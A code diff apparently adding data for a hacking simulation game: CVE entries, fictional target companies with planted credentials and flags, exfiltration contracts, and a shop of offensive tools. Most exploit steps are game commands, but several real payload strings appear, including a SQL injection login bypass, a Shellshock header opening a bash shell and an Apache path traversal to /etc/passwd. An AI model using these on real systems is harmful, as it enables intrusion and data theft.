+  {id:'CVE-2020-1938',name:'Tomcat Ghostcat AJP File Read',score:9.8,sev:'critical',service:'Tomcat 6.x-9.0.30',port:8009,desc:'AJP connector allows unauthenticated file read and RCE.',exploit:'Requires: metasploit\\nexploit CVE-2020-1938 <ip>\\nReads: /opt/tomcat/conf/tomcat-users.xml',fix:'Disable AJP or bind to localhost.',phase:'Exploitation'},
+  {id:'CVE-2021-22144',name:'Kibana SSRF Canvas Renderer',score:7.2,sev:'high',service:'Kibana 7.x < 7.13.1',port:5601,desc:'SSRF allows pivoting to internal Elasticsearch clusters.',exploit:'Requires: metasploit\\nexploit CVE-2021-22144 <ip>\\nPivots to internal ES',fix:'Upgrade Kibana 7.13.1+.',phase:'Pivot'},
+  {id:'CVE-2022-1388',name:'F5 BIG-IP iControl REST Auth Bypass',score:9.8,sev:'critical',service:'F5 BIG-IP 13.x-16.x',port:443,desc:'Auth bypass allows unauthenticated RCE as root via iControl REST.',exploit:'Requires: metasploit-pro\\nexploit CVE-2022-1388 <ip>\\nResult: root shell',fix:'Apply F5 hotfix. Block iControl from internet.',phase:'Exploitation'},
+  {id:'NB-MOD-001',name:'vsftpd 2.3.4 Backdoor (Simulated)',score:10.0,sev:'critical',service:'vsftpd 2.3.4',port:21,desc:'[FICTIONAL SIM] Backdoor triggers bind shell on port 6200.',exploit:'Requires: netcat (pre-installed)\\nexploit vsftpd-backdoor <ip>\\nResult: root bind shell port 6200',fix:'Replace vsftpd immediately.',phase:'Exploitation root'},
+  {id:'NB-MOD-002',name:'S7comm Auth Bypass ICS/SCADA (Simulated)',score:10.0,sev:'critical',service:'Siemens S7comm (Sim)',port:102,desc:'[FICTIONAL SIM] Legacy S7comm has no auth, direct PLC read/write.',exploit:'Requires: metasploit-pro\\nexploit S7-auth-bypass <ip>\\nReads PLC map, pivots to HMI',fix:'Segment ICS. VPN for remote. Patch vendor.',phase:'ICS Exploitation'},
+  {id:'NB-WEB-001',name:'SQL Injection Error-Based (Simulated)',score:8.5,sev:'high',service:'PHP/MySQL Web App',port:80,desc:'[FICTIONAL SIM] Unsanitized SQL allows auth bypass and data dump.',exploit:'Browser: login field: \' OR \'1\'=\'1\'--\\nTerminal: exploit sqli <ip>',fix:'Use prepared statements.',phase:'Web Exploitation'},
+  {id:'NB-WEB-002',name:'XSS Reflected (Simulated)',score:6.1,sev:'med',service:'Web App Search/Contact',port:80,desc:'[FICTIONAL SIM] Input echoed without encoding executes scripts.',exploit:'Terminal: exploit xss <ip>\\nBrowser: inject script payload in search/contact',fix:'Encode output. Set Content-Security-Policy.',phase:'Web Exploitation'},
+];
+
+var CVE_DISCOVERED = [
+  {id:'CVE-2021-41773',name:'Apache 2.4.49 Path Traversal/RCE',score:9.8,sev:'critical',service:'Apache/2.4.49',port:80,desc:'[FICTIONAL SIM] Path traversal in Apache 2.4.49 allows reading files outside docroot and RCE if mod_cgi enabled.',exploit:'Requires: metasploit\\nexploit CVE-2021-41773 <ip>\\nPath: /cgi-bin/.%2e/.%2e/etc/passwd',fix:'Upgrade Apache. Deny access to docroot.',phase:'Exploitation'},
+  {id:'CVE-2019-0708',name:'BlueKeep RDP RCE (Simulated)',score:9.8,sev:'critical',service:'RDP / Win Server 2003-2008',port:3389,desc:'[FICTIONAL SIM] Unauthenticated RCE via RDP pre-auth. Wormable.',exploit:'Requires: metasploit-pro\\nexploit CVE-2019-0708 <ip>\\nResult: SYSTEM shell',fix:'Patch MS19-0708. Disable RDP or enable NLA.',phase:'Exploitation'},
+  {id:'CVE-2014-6271',name:'Shellshock Bash RCE (Simulated)',score:10.0,sev:'critical',service:'Bash via CGI',port:80,desc:'[FICTIONAL SIM] Environment variable injection in Bash allows RCE via CGI scripts.',exploit:'Requires: metasploit\\nexploit CVE-2014-6271 <ip>\\nHeader: User-Agent: () { :; }; /bin/bash -i',fix:'Patch Bash. Disable CGI or use non-bash shells.',phase:'Exploitation'},
+  {id:'CVE-2018-11776',name:'Apache Struts2 OGNL Injection',score:10.0,sev:'critical',service:'Apache Struts2',port:80,desc:'[FICTIONAL SIM] OGNL injection via URL allows RCE without authentication.',exploit:'Requires: metasploit\\nexploit CVE-2018-11776 <ip>\\nResult: www-data shell',fix:'Upgrade Struts2. Restrict file upload.',phase:'Exploitation'},
+  {id:'CVE-2017-5638',name:'Apache Struts Jakarta Multipart RCE',score:10.0,sev:'critical',service:'Apache Struts2',port:80,desc:'[FICTIONAL SIM] Content-Type header injection in multipart parser allows RCE.',exploit:'Requires: metasploit\\nexploit CVE-2017-5638 <ip>\\nResult: www-data shell',fix:'Upgrade Struts2 2.3.32+.',phase:'Exploitation'},
+  {id:'CVE-2021-3156',name:'Sudo Heap Overflow - Baron Samedit (Simulated)',score:7.8,sev:'high',service:'sudo < 1.9.5p2',port:22,desc:'[FICTIONAL SIM] Heap overflow in sudo sudoedit allows any local user to escalate to root.',exploit:'Requires: shell access\\nprivesc sudo-baron\\nExploits sudoedit -s flag',fix:'Upgrade sudo to 1.9.5p2+.',phase:'Privilege Escalation'},
+  {id:'CVE-2021-4034',name:'Polkit pkexec LPE - PwnKit (Simulated)',score:7.8,sev:'high',service:'polkit < 0.120',port:22,desc:'[FICTIONAL SIM] Out-of-bounds write in pkexec allows any local user to escalate to root.',exploit:'Requires: shell access\\nprivesc pwnkit\\nWrites to environment via pkexec',fix:'Upgrade polkit. Chmod 0755 /usr/bin/pkexec as workaround.',phase:'Privilege Escalation'},
+  {id:'CVE-2022-0847',name:'Dirty Pipe Linux Kernel LPE (Simulated)',score:7.8,sev:'high',service:'Linux kernel 5.8-5.16',port:22,desc:'[FICTIONAL SIM] Pipe buffer flag manipulation allows overwriting read-only files and root escalation.',exploit:'Requires: shell access\\nprivesc dirty-pipe\\nOverwrites /etc/passwd root entry',fix:'Upgrade kernel 5.16.11+.',phase:'Privilege Escalation'},
+  {id:'NB-MONGO-001',name:'MongoDB Unauthenticated Access (Simulated)',score:9.8,sev:'critical',service:'MongoDB < 3.6',port:27017,desc:'[FICTIONAL SIM] MongoDB instances with no auth exposed publicly. Full DB read/write.',exploit:'Requires: metasploit\\nexploit unauth-mongo <ip>\\nDumps all databases',fix:'Enable MongoDB auth. Bind to localhost only.',phase:'Exploitation'},
+  {id:'NB-REDIS-001',name:'Redis Unauthenticated RCE (Simulated)',score:9.8,sev:'critical',service:'Redis (no auth)',port:6379,desc:'[FICTIONAL SIM] Unauthenticated Redis allows writing cron jobs via config SET command for RCE.',exploit:'Requires: metasploit\\nexploit unauth-redis <ip>\\nWrites cron to /etc/cron.d',fix:'Set Redis requirepass. Bind to localhost.',phase:'Exploitation'},
+];
+
+var CVE_DISC_MAP = {
+  'CVE-2021-41773': 'CVE-2021-41773',
+  'CVE-2019-0708': 'CVE-2019-0708',
+  'CVE-2014-6271': 'CVE-2014-6271',
+  'CVE-2018-11776': 'CVE-2018-11776',
+  'CVE-2017-5638': 'CVE-2017-5638',
+  'CVE-2021-3156': 'CVE-2021-3156',
+  'CVE-2021-4034': 'CVE-2021-4034',
+  'CVE-2022-0847': 'CVE-2022-0847',
+  'NB-MONGO-001': 'NB-MONGO-001',
+  'NB-REDIS-001': 'NB-REDIS-001',
+  'CVE-2016-0777': 'CVE-2016-0777',
+  'CVE-2017-7679': 'CVE-2017-7679',
+  'CVE-2020-1938': 'CVE-2020-1938',
+  'CVE-2021-22144': 'CVE-2021-22144',
+  'CVE-2022-1388': 'CVE-2022-1388',
+  'NB-MOD-001': 'NB-MOD-001',
+  'NB-MOD-002': 'NB-MOD-002',
+  'vsftpd-backdoor': 'NB-MOD-001',
+  'S7-auth-bypass': 'NB-MOD-002'
+};
+
+// ══ COMPANY DEFINITIONS ══
+// To add a custom company: append an object following this schema to COMPANY_DEFS.
+// Fields: id(str), name, domain, ip, industry, desc, diff(easy/med/hard/elite),
+//   repReq(int), sec{fw,ids,mfa,waf}(bool), scanReq{nmap,gobuster,sniffer}(bool),
+//   ports[{num,svc,ver,vuln,note}], creds{user:pass}, rootMethod(str),
+//   webVulns[str], webPages[str], fs{path:[entries]}, fc{path:content},
+//   contracts[{id,title,desc,target,reward:{c,r}}]
+var COMPANY_DEFS = [
+{
+  id:'c0',name:'PetroFlow Systems',domain:'petroflow.local',ip:'192.168.10.14',
+  industry:'Oil & Gas Pipeline Monitoring',
+  desc:'Small regional pipeline operator. ~60 staff. Legacy infra, no security stack.',
+  diff:'easy',repReq:0,
+  sec:{fw:false,ids:false,mfa:false,waf:false},
+  scanReq:{nmap:false,gobuster:false,sniffer:false},
+  ports:[{num:21,svc:'FTP',ver:'vsftpd 2.3.4',vuln:'vsftpd-backdoor',note:'Known backdoor version'},{num:22,svc:'SSH',ver:'OpenSSH 7.2p2',vuln:'CVE-2016-0777',note:'User enum via timing'},{num:80,svc:'HTTP',ver:'Apache/2.2.34',vuln:'CVE-2017-7679',note:'mod_mime overflow + SQLi'},{num:3306,svc:'MySQL',ver:'5.5.62',vuln:'weak-creds',note:'root:root default creds'}],
+  creds:{'marcus.reed':'Pipeline2019!','backup':'backup123','root':'root'},
+  rootMethod:'sudo -l shows NOPASSWD: /bin/bash then sudo /bin/bash',
+  webVulns:['sqli','xss','idor'],
+  webPages:['home','about','services','contact','portal','api'],
+  fs:{'/':['etc','home','var','tmp','root','opt'],'/etc':['passwd','shadow','hosts','crontab'],'/home':['marcus.reed','backup'],'/home/marcus.reed':['notes.txt','vpn_config.ovpn','.bash_history'],'/home/backup':['backup.sh','creds.bak'],'/var':['log','www'],'/var/www':['html'],'/var/www/html':['index.php','login.php','config.php','search.php','api'],'/var/www/html/api':['users.php','orders.php'],'/root':['flag.txt','id_rsa'],'/tmp':[],'/opt':['scripts'],'/opt/scripts':['monitor.sh']},
+  fc:{'/home/marcus.reed/notes.txt':'== NOTES ==\nReminder: rotate backup password (still backup123)\nTODO: fix old vsftpd -- sketchy version\nDB server 192.168.10.20 - root/root\nSearch page breaks on quotes\nI can sudo to bash NOPASSWD -- IT should review','/home/marcus.reed/.bash_history':'ssh root@192.168.10.20\nsudo /bin/bash\ncat /var/www/html/config.php','/home/backup/creds.bak':'# Legacy -- SHOULD BE DELETED\nmysql_root: root\nmysql_app: pfapp / PetroApp#1\nssh_backup: backup / backup123','/home/backup/backup.sh':'#!/bin/bash\n# Runs as root via cron\ntar -czf /tmp/web_backup_$(date +%F).tar.gz /var/www/html','/var/www/html/config.php':'<?php\n$db_host=\'192.168.10.20\';\n$db_user=\'root\';\n$db_pass=\'root\';\n$db_name=\'petroflow\';\n$debug_mode=true;\n?>','/etc/passwd':'root:x:0:0:root:/root:/bin/bash\nmarcus.reed:x:1001:1001::/home/marcus.reed:/bin/bash\nbackup:x:1002:1002::/home/backup:/bin/bash','/etc/hosts':'127.0.0.1 localhost\n192.168.10.14 petroflow.local\n192.168.10.20 pf-db01','/etc/crontab':'*/5 * * * *  root  /opt/scripts/monitor.sh\n0 2 * * *    root  /home/backup/backup.sh','/root/flag.txt':'NETBREAKER{PF_R00T_4CQUIRED}\n\nRoot on PetroFlow Systems confirmed.'},
+  contracts:[{id:'pf-c1',title:'Recover DB Credentials',desc:'Exfiltrate /var/www/html/config.php',target:'/var/www/html/config.php',reward:{c:300,r:60}},{id:'pf-c2',title:'Root the Box',desc:'Exfiltrate /root/flag.txt',target:'/root/flag.txt',reward:{c:800,r:150}},{id:'pf-c3',title:'Harvest Backup Creds',desc:'Exfiltrate /home/backup/creds.bak',target:'/home/backup/creds.bak',reward:{c:200,r:40}}]
+},
+{
+  id:'c1',name:'NexGenPharm Research',domain:'ngpharma.net',ip:'10.0.5.22',
+  industry:'Pharmaceutical R&D',
+  desc:'Mid-size drug research org. IDS + WAF active. Multiple entry vectors.',
+  diff:'med',repReq:200,
+  sec:{fw:true,ids:true,mfa:false,waf:true},
+  scanReq:{nmap:true,gobuster:true,sniffer:true},
+  ports:[{num:443,svc:'HTTPS',ver:'nginx/1.14.2',vuln:'CVE-2021-22144',note:'Kibana SSRF'},{num:22,svc:'SSH',ver:'OpenSSH 8.1p1',vuln:'CVE-2016-0777',note:'User enum'},{num:8009,svc:'AJP',ver:'Tomcat/9.0.1',vuln:'CVE-2020-1938',note:'Ghostcat file read/RCE'},{num:5432,svc:'PgSQL',ver:'PostgreSQL 12.1',vuln:'weak-creds',note:'dev:dev123'},{num:6379,svc:'Redis',ver:'Redis 6.0.3',vuln:'NB-REDIS-001',note:'No auth configured'}],
+  creds:{'dev.ops':'DevOps2021!','dev':'dev123'},
+  rootMethod:'SUID /usr/local/bin/pharmactl calls execve(\'/bin/sh\') giving root',
+  webVulns:['sqli','lfi','csrf'],
+  webPages:['home','pipeline','careers','contact','portal'],
+  fs:{'/':['etc','home','opt','var','tmp','root'],'/etc':['passwd','hosts'],'/home':['dev.ops','dr.yamamoto'],'/home/dev.ops':['build_notes.txt','.ssh'],'/home/dev.ops/.ssh':['authorized_keys','id_rsa'],'/home/dr.yamamoto':['meeting_notes.txt'],'/opt':['pharmactl','tomcat'],'/opt/tomcat':['conf','webapps'],'/opt/tomcat/conf':['tomcat-users.xml','server.xml'],'/root':['flag.txt'],'/tmp':[]},
+  fc:{'/home/dev.ops/build_notes.txt':'AJP connector left enabled (TICKET-2847)\nDB: dev/dev123 on PostgreSQL\npharmactl SUID -- IT says intentional\nKibana SSRF (TICKET-3011)\nRedis on 6379 -- no auth set','/opt/tomcat/conf/tomcat-users.xml':'<?xml version=\'1.0\'?>\n<tomcat-users>\n  <user username=\'tomcat-mgr\' password=\'Tomcat$Mgr2021\' roles=\'manager-gui,manager-script\'/>\n</tomcat-users>','/home/dr.yamamoto/meeting_notes.txt':'Meeting 2024-01-15\n- NGP-447 trial results positive\n- IT audit flagged AJP issue\n- pharmactl SUID flagged\n- Data must NOT leave network unencrypted','/etc/passwd':'root:x:0:0:root:/root:/bin/bash\ndev.ops:x:1001:1001::/home/dev.ops:/bin/bash','/root/flag.txt':'NETBREAKER{NGP_PHARM_PWNED}\n\nRoot on NexGenPharm confirmed.'},
+  contracts:[{id:'ng-c1',title:'Ghostcat File Read',desc:'CVE-2020-1938 read /opt/tomcat/conf/tomcat-users.xml',target:'/opt/tomcat/conf/tomcat-users.xml',reward:{c:600,r:100}},{id:'ng-c2',title:'Root the Pharma Box',desc:'Root and exfil /root/flag.txt',target:'/root/flag.txt',reward:{c:2500,r:400}}]
+},
+{
+  id:'c2',name:'Darkpeak Analytics',domain:'darkpeak.io',ip:'10.20.5.50',
+  industry:'Data Broker / Analytics',
+  desc:'Shadow data broker. Sells consumer profiles. MongoDB and Elastic exposed.',
+  diff:'med',repReq:500,
+  sec:{fw:true,ids:false,mfa:false,waf:false},
+  scanReq:{nmap:true,gobuster:false,sniffer:false},
+  ports:[{num:22,svc:'SSH',ver:'OpenSSH 7.9p1',vuln:'CVE-2016-0777',note:'User enum'},{num:80,svc:'HTTP',ver:'Apache/2.4.38',vuln:'CVE-2017-7679',note:'mod_mime overflow'},{num:27017,svc:'MongoDB',ver:'MongoDB 3.4.23',vuln:'NB-MONGO-001',note:'No auth, public'},{num:9200,svc:'Elastic',ver:'ES 6.8.0',vuln:'NB-REDIS-001',note:'No auth, consumer PII'}],
+  creds:{'deploy':'Deploy#2022!','admin':'darkpeak123'},
+  rootMethod:'Writable /etc/cron.d as deploy user -- add root reverse shell entry',
+  webVulns:['idor','sqli'],
+  webPages:['home','about','services','contact','portal'],
+  fs:{'/':['etc','home','var','root','opt'],'/etc':['passwd','crontab','cron.d'],'/etc/cron.d':['darkpeak-backup','darkpeak-sync'],'/home':['deploy','admin'],'/home/deploy':['sync.sh','notes.txt'],'/home/admin':['db_dump.sh'],'/opt':['darkpeak'],'/opt/darkpeak':['api.js','config.json'],'/root':['flag.txt'],'/var':['log']},
+  fc:{'/home/deploy/notes.txt':'MongoDB on 27017 -- auth disabled for dev, TODO fix\nElastic also open -- consumer_profiles index 14M records\nDeploy user can write to /etc/cron.d','/opt/darkpeak/config.json':'{"db":"mongodb://localhost:27017/darkpeak","elastic":"http://localhost:9200","admin_pass":"darkpeak123"}','/root/flag.txt':'NETBREAKER{DARKPEAK_DAT4_BR0K3R_0WN3D}\n\nDarkpeak Analytics rooted.'},
+  contracts:[{id:'dp-c1',title:'MongoDB Data Dump',desc:'Exploit unauthenticated MongoDB on 27017',target:'mongo_dump',reward:{c:1200,r:180}},{id:'dp-c2',title:'Root Darkpeak',desc:'Root and exfil /root/flag.txt',target:'/root/flag.txt',reward:{c:3000,r:500}}]
+},
+{
+  id:'c3',name:'Arclight Financial Group',domain:'arclightfg.com',ip:'172.16.5.100',
+  industry:'Investment Banking',
+  desc:'Hardened financial institution. WAF + IDS + MFA. Segmented zones.',
+  diff:'hard',repReq:600,
+  sec:{fw:true,ids:true,mfa:true,waf:true},
+  scanReq:{nmap:true,gobuster:true,sniffer:true},
+  ports:[{num:443,svc:'HTTPS',ver:'F5 BIG-IP 15.1.2',vuln:'CVE-2022-1388',note:'iControl REST auth bypass'},{num:8443,svc:'Kibana',ver:'Kibana 7.12.0',vuln:'CVE-2021-22144',note:'SSRF to internal ES'},{num:9200,svc:'Elastic',ver:'ES 7.12.0',vuln:'unauth-elastic',note:'Internal only'},{num:3389,svc:'RDP',ver:'Win Server 2019',vuln:'CVE-2019-0708',note:'Internal RDP post-pivot'},{num:22,svc:'SSH',ver:'OpenSSH 8.9p1',vuln:'none',note:'Hardened'}],
+  creds:{'svc.monitor':'M0n1tor$2023'},
+  rootMethod:'SeImpersonatePrivilege then SYSTEM via token impersonation',
+  webVulns:['idor','csrf','auth-bypass'],
+  webPages:['home','about','services','compliance','contact','portal'],
+  fs:{'/':['C:'],'/C:':['Users','Logs','Program Files'],'/C:/Users':['Administrator','svc.monitor'],'/C:/Users/Administrator':['Desktop'],'/C:/Users/Administrator/Desktop':['flag.txt','arclight_keys.xlsx'],'/C:/Logs':['kibana.log','elastic.log']},
+  fc:{'/C:/Users/Administrator/Desktop/flag.txt':'NETBREAKER{ARC_F1N_SYS73M_0WN3D}\n\nSYSTEM on Arclight Financial Group.','/C:/Logs/kibana.log':'[09:13] WARN Elasticsearch: no TLS, no auth\n[09:45] ERROR SSRF blocked by WAF\n[10:02] INFO elastic.admin authenticated'},
+  contracts:[{id:'af-c1',title:'Elastic Data Exfil',desc:'Access Elasticsearch via Kibana SSRF',target:'elastic_dump',reward:{c:2000,r:300}},{id:'af-c2',title:'Domain Admin Flag',desc:'Exfil /C:/Users/Administrator/Desktop/flag.txt',target:'/C:/Users/Administrator/Desktop/flag.txt',reward:{c:8000,r:1200}}]
+},
+{
+  id:'c4',name:'OmniCloud Hosting',domain:'omnicloud.net',ip:'185.14.6.88',
+  industry:'Cloud VPS / Hosting Provider',
+  desc:'Offshore VPS provider. Hosts hundreds of tenants. Valuable pivot point.',
+  diff:'hard',repReq:1000,
+  sec:{fw:true,ids:true,mfa:false,waf:true},
+  scanReq:{nmap:true,gobuster:true,sniffer:true},
+  ports:[{num:443,svc:'HTTPS',ver:'nginx/1.18.0',vuln:'CVE-2021-22144',note:'Kibana SSRF in mgmt'},{num:22,svc:'SSH',ver:'OpenSSH 8.2p1',vuln:'CVE-2016-0777',note:'User enum'},{num:2222,svc:'SSH-mgmt',ver:'OpenSSH 7.4p1',vuln:'CVE-2016-0777',note:'Legacy mgmt SSH'},{num:8080,svc:'HTTP',ver:'Jetty/9.4.35',vuln:'CVE-2020-1938',note:'AJP connector exposed'},{num:4567,svc:'Sinatra',ver:'Sinatra 2.1.0',vuln:'weak-creds',note:'Tenant API: admin:admin'}],
+  creds:{'sysadmin':'OmniSys$2021','admin':'admin'},
+  rootMethod:'sudo -l shows NOPASSWD: /usr/sbin/service -- service exploit to root',
+  webVulns:['sqli','lfi','idor'],
+  webPages:['home','plans','support','datacenter','contact','portal'],
+  fs:{'/':['etc','home','var','root','opt','srv'],'/etc':['passwd','shadow','hosts','sudoers'],'/home':['sysadmin','billing'],'/home/sysadmin':['tenant_list.txt','.ssh','mgmt.sh'],'/home/sysadmin/.ssh':['authorized_keys','id_rsa'],'/opt':['omnicloud'],'/opt/omnicloud':['tenants.db','billing.conf'],'/root':['flag.txt','master_key.pem'],'/srv':['tenants']},
+  fc:{'/home/sysadmin/tenant_list.txt':'TENANT ROSTER (confidential)\ntenant_001: cryptomine.xyz  -- VPS Pro\ntenant_002: darksite.onion -- VPS Ultra\ntenant_003: botnet-ctrl.ru -- flagged, pending review\nInternal VLAN: 192.168.200.0/24','/opt/omnicloud/billing.conf':'db_host=localhost\ndb_pass=Billing$Omni2022\nadmin_api=http://localhost:4567\nroot_ssh_key=/root/master_key.pem','/root/flag.txt':'NETBREAKER{0MN1CL0UD_H0ST_PWN3D}\n\nOmniCloud root obtained. Internal tenant VLAN: 192.168.200.0/24','/root/master_key.pem':'-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA[SIMULATION -- master tenant key]\n-----END RSA PRIVATE KEY-----'},
+  contracts:[{id:'oc-c1',title:'Tenant Roster Exfil',desc:'Retrieve /home/sysadmin/tenant_list.txt',target:'/home/sysadmin/tenant_list.txt',reward:{c:2000,r:300}},{id:'oc-c2',title:'Root OmniCloud',desc:'Root and exfil /root/flag.txt',target:'/root/flag.txt',reward:{c:6000,r:900}},{id:'oc-c3',title:'Master Key',desc:'Exfil /root/master_key.pem',target:'/root/master_key.pem',reward:{c:4000,r:500}}]
+},
+{
+  id:'c5',name:'CivicGrid Power Authority',domain:'civicgrid.ics',ip:'10.10.1.5',
+  industry:'Critical Infrastructure / ICS-SCADA',
+  desc:'Power grid control system. Modbus, S7comm, DNP3. Extreme hardening.',
+  diff:'elite',repReq:1800,
+  sec:{fw:true,ids:true,mfa:true,waf:true},
+  scanReq:{nmap:true,gobuster:true,sniffer:true},
+  ports:[{num:102,svc:'S7comm',ver:'Siemens S7-1500',vuln:'S7-auth-bypass',note:'Legacy auth bypass'},{num:502,svc:'Modbus',ver:'Schneider Modicon M340',vuln:'modbus-no-auth',note:'No authentication'},{num:20000,svc:'DNP3',ver:'GE Grid Solutions',vuln:'dnp3-replay',note:'No sequence numbers'},{num:443,svc:'HTTPS',ver:'IIS 10.0',vuln:'CVE-2022-1388',note:'F5 in front'}],
+  creds:{'scada.ops':'Gr1dOps$2023'},
+  rootMethod:'S7comm auth bypass then PLC register write then HMI admin panel then root',
+  webVulns:['auth-bypass','idor'],
+  webPages:['home','operations','about','contact','portal'],
+  fs:{'/':['opt','home','root','etc'],'/opt':['scada','hmi'],'/opt/scada':['plc_map.cfg','alarms.log','config.xml'],'/home':['scada.ops'],'/home/scada.ops':['shift_notes.txt'],'/root':['flag.txt','grid_topology.pdf'],'/etc':['passwd','modbus.conf']},
+  fc:{'/root/flag.txt':'NETBREAKER{C1V1C_GR1D_3L1T3_PWN3D}\n\nCritical infrastructure fully compromised.','/opt/scada/plc_map.cfg':'[PLC_MAP v2.3]\nPLC_001=192.168.100.10:Substation_Alpha\nPLC_002=192.168.100.11:Substation_Beta\n\n[AUTH]\nmode=legacy_compat\nbypass_allowed=true','/home/scada.ops/shift_notes.txt':'Shift log 2024-01-15\n-- S7comm legacy mode still active (IT ticket 8821)\n-- HMI admin password on sticky note in server room','/etc/modbus.conf':'[MODBUS_SERVER]\nauth_required=false\nlog_requests=false'},
+  contracts:[{id:'cg-c1',title:'Exfil PLC Map',desc:'Retrieve /opt/scada/plc_map.cfg',target:'/opt/scada/plc_map.cfg',reward:{c:4000,r:700}},{id:'cg-c2',title:'ICS Elite Root Flag',desc:'Full compromise /root/flag.txt',target:'/root/flag.txt',reward:{c:25000,r:6000}}]
+},
+{
+  id:'c6',name:'Sentinel Defense Systems',domain:'sentinel-ds.com',ip:'172.31.10.5',
+  industry:'Defense Contractor',
+  desc:'Private defense contractor. Classified projects. Nation-state hardening.',
+  diff:'elite',repReq:3500,
+  sec:{fw:true,ids:true,mfa:true,waf:true},
+  scanReq:{nmap:true,gobuster:true,sniffer:true},
+  ports:[{num:443,svc:'HTTPS',ver:'F5 BIG-IP 16.0.1',vuln:'CVE-2022-1388',note:'iControl auth bypass'},{num:8443,svc:'Kibana',ver:'Kibana 7.11.0',vuln:'CVE-2021-22144',note:'SSRF to internal ES'},{num:1433,svc:'MSSQL',ver:'SQL Server 2019',vuln:'weak-creds',note:'sa:Sent1nel2019'},{num:22,svc:'SSH',ver:'OpenSSH 8.4p1',vuln:'none',note:'Fully hardened'}],
+  creds:{'svc.backup':'Sent1nel2019','sa':'Sent1nel2019'},
+  rootMethod:'MSSQL xp_cmdshell via sa then SeImpersonatePrivilege to SYSTEM',
+  webVulns:['auth-bypass','idor','csrf'],
+  webPages:['home','about','contracts','careers','contact','portal'],
+  fs:{'/':['C:'],'/C:':['Users','Projects','Logs','Windows'],'/C:/Users':['Administrator','svc.backup'],'/C:/Users/Administrator':['Desktop','Documents'],'/C:/Users/Administrator/Desktop':['flag.txt','CLASSIFIED_SUMMARY.pdf','encryption_keys.txt'],'/C:/Projects':['IRONCLAD','PHANTOM_NET','DARKSTAR'],'/C:/Projects/IRONCLAD':['specs.enc','budget.xlsx','contacts.txt'],'/C:/Logs':['mssql.log','ids.log']},
+  fc:{'/C:/Users/Administrator/Desktop/flag.txt':'NETBREAKER{S3NT1N3L_CL4SS1F13D_PWN3D}\n\nSentinel Defense Systems fully compromised. Nation-state tier.','/C:/Projects/IRONCLAD/contacts.txt':'Project IRONCLAD Contacts\nClearance: TOP SECRET / SCI\nBudget: $847M','/C:/Logs/mssql.log':'2024-01-15 09:01 Login: sa from 172.31.10.50\n2024-01-15 09:44 xp_cmdshell enabled by sa'},
+  contracts:[{id:'sd-c1',title:'IRONCLAD Project Data',desc:'Exfil /C:/Projects/IRONCLAD/contacts.txt',target:'/C:/Projects/IRONCLAD/contacts.txt',reward:{c:12000,r:2000}},{id:'sd-c2',title:'Sentinel Root Flag',desc:'Full compromise /C:/Users/Administrator/Desktop/flag.txt',target:'/C:/Users/Administrator/Desktop/flag.txt',reward:{c:30000,r:5000}}]
+}
+];
+
+// The engine reads COMPANY_DEFS at startup. COMPANIES is the live copy.
+var COMPANIES = COMPANY_DEFS;
+
+var SHOP = [
+  {id:'netcat',icon:'🔗',name:'netcat',cat:'network',desc:'TCP/UDP tool. Reverse shells, port scan, file transfer. Pre-installed.',cost:{c:0,r:0},cmds:['nc <ip> <port>','nc -lvnp <port>']},
+  {id:'nmap-adv',icon:'📡',name:'nmap advanced',cat:'recon',desc:'OS detect, scripting, full version scan. Pre-installed.',cost:{c:0,r:0},cmds:['nmap -sV -sC -O <ip>']},
+  {id:'gobuster',icon:'🔍',name:'gobuster',cat:'recon',desc:'Web directory brute-forcer. Required for hard targets.',cost:{c:100,r:0},cmds:['gobuster <ip>']},
+  {id:'hydra',icon:'🔑',name:'hydra',cat:'exploit',desc:'Network login brute-forcer. NOISY -- prefer sniffer first.',cost:{c:150,r:0},cmds:['brute ssh <ip>','brute ftp <ip>']},
+  {id:'sqlmap',icon:'💉',name:'sqlmap',cat:'webexpl',desc:'Automated SQL injection scanner and exploiter.',cost:{c:200,r:0},cmds:['exploit sqli <ip>']},
+  {id:'metasploit',icon:'💀',name:'Metasploit',cat:'exploit',desc:'Exploit framework. Required for all CVE-based exploitation.',cost:{c:300,r:50},cmds:['exploit <CVE> <ip>']},
+  {id:'metasploit-pro',icon:'☠',name:'Metasploit Pro',cat:'exploit',desc:'Post-exploit: token impersonation, pivoting. Required for hard/elite.',cost:{c:2500,r:400},cmds:['privesc token','pivot <src> <dst>']},
+  {id:'linpeas',icon:'🐧',name:'linPEAS',cat:'post',desc:'Linux PrivEsc auto-scanner. Finds sudo, SUID, cron vectors.',cost:{c:400,r:80},cmds:['privesc linpeas']},
+  {id:'mimikatz',icon:'🧠',name:'mimikatz',cat:'post',desc:'Windows credential harvesting from LSASS memory.',cost:{c:1800,r:300},cmds:['privesc mimikatz']},
+  {id:'burpsuite',icon:'🕵',name:'Burp Suite',cat:'webexpl',desc:'Web proxy. Use INTERCEPT in Browser pane.',cost:{c:800,r:150},cmds:['INTERCEPT in browser pane']},
+  {id:'crontab-kit',icon:'⏰',name:'Persistence Kit',cat:'persist',desc:'Cron, SSH backdoor, systemd service persistence.',cost:{c:700,r:120},cmds:['persist cron','persist backdoor']},
+  {id:'exfil-kit',icon:'📤',name:'Exfil Toolkit',cat:'exfil',desc:'Encrypted DNS/HTTPS covert channel. Evades DLP.',cost:{c:900,r:180},cmds:['exfil <path> dns','exfil <path> https']},
+  {id:'log-cleaner',icon:'🧹',name:'Log Cleaner',cat:'opsec',desc:'Wipes auth.log, syslog, bash_history on target. Reduces wanted.',cost:{c:800,r:0},cmds:['clearlogs <ip>']},
+  {id:'ip-rotator',icon:'🔄',name:'IP Rotator',cat:'opsec',desc:'Rotates attacker IP via proxy chain. Breaks traces. Wanted -2.',cost:{c:1500,r:150},cmds:['rotateip']},
+  {id:'vpn-chain',icon:'🌐',name:'VPN Chain',cat:'opsec',desc:'3-hop proxy. Reduces wanted gain rate by 60%. Passive.',cost:{c:1200,r:200},cmds:['[Passive]']},
+  {id:'tor',icon:'🧅',name:'TOR Router',cat:'opsec',desc:'Full TOR. Prevents wanted gain entirely. Required for elite.',cost:{c:3500,r:700},cmds:['[Passive]']},
+  {id:'miner',icon:'⛏',name:'XMR Miner',cat:'mining',desc:'Deploy on rooted hosts for passive credit income every 30 seconds.',cost:{c:500,r:50},cmds:['deploy miner <ip>','miners']},
+  {id:'miner-pool',icon:'📡',name:'Mining Pool',cat:'mining',desc:'Connects all miners to optimized pool. Doubles ALL miner rates.',cost:{c:2000,r:200},cmds:['[Passive -- doubles income]']},
+];
+
+
+// ====== GAME STATE ======
+var G=null;
+function defaultState(handle){
+  var contracts={};
